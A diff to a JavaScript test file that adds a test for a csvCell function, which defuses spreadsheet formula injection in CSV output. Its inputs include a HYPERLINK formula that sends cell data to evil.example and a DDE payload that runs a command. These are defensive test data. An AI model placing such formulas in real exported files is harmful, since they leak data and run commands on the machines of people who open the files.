@@ -4,6 +4,7 @@ import { test } from "node:test";
 import {
   allowedLicense,
   choosePhoto,
+  csvCell,
   fileTitleFromUri,
   loadPicks,
   normalizeTitle,
@@ -42,6 +43,19 @@ test("stripHtml: tags out, entities decoded, whitespace and control characters c
 });
 
 // ---- Titles and Wikidata -------------------------------------------------------------
+
+test("csvCell: a cell a spreadsheet would run as a formula is defused, then quoted as usual", () => {
+  assert.equal(csvCell('=HYPERLINK("https://evil.example/?"&A2,"Photographer")'), `"'=HYPERLINK(""https://evil.example/?""&A2,""Photographer"")"`);
+  for (const lead of ["=", "+", "-", "@", "\t", "\r", "  ="]) {
+    assert.ok(csvCell(`${lead}1+1`).replace(/^"/, "").startsWith("'"), JSON.stringify(lead));
+  }
+  assert.equal(csvCell("@cmd|' /C calc'!A0"), "'@cmd|' /C calc'!A0");
+  assert.equal(csvCell("José & Co."), "José & Co.");
+  assert.equal(csvCell("Smith, Jane"), '"Smith, Jane"');
+  assert.equal(csvCell("a\nb"), '"a\nb"');
+  assert.equal(csvCell(166683), "166683");
+  assert.equal(csvCell("File:A-B.jpg"), "File:A-B.jpg", "a dash inside is left alone");
+});
 
 test("normalizeTitle: MediaWiki's form, and refusal of what can't be a title", () => {
   assert.equal(normalizeTitle("File:Great_dome_of_MIT,_Feb_2021.jpg"), "File:Great dome of MIT, Feb 2021.jpg");
